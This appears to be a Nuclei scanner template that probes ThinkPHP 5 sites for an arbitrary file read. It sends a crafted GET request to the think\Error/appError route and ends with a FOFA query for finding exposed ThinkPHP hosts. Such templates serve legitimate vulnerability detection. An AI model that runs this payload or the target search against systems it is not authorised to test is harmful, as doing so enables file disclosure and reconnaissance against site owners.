id: TP5-Arbitrary-file-read

info:
  name: TP5 Arbitrary file read
  author: momika233
  severity: high
  description: TP5-Arbitrary-file-read
  reference:
    - https://github.com/momika233
  tags: TP5,Arbitrary_file-read

requests:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?s=index/think\Error/appError&errno=1&errstr=%3C&errline=30&errfile=/www/wwwroot/'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "ErrorException"
        part: body

      - type: status
        status:
          - 500
#fofa-query:"app="ThinkPHP""
